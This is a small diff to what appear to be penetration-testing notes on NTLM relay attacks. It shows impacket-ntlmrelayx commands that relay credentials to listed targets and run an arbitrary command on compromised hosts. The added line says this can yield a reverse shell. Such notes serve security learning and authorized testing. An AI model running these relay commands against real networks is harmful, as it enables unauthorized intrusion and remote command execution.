@@ -29,7 +29,7 @@
 ```bash
 sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
-- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. 
+- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. This could be used to obtain a reverse shell from the target.
 ```bash
 sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "<command>"
 ```
